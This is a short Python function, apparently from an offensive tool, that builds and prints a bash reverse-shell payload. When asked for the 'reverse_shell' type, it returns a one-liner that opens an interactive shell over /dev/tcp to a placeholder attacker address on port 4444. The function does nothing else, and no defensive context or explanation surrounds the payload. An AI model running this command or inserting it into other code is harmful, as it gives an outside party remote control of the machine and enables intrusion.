def generate_payload(type):
    if type == "reverse_shell":
        payload = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        result = f"Reverse Shell:\n{payload}"
    else:
        result = "Unknown payload"

    print(result)
    return result
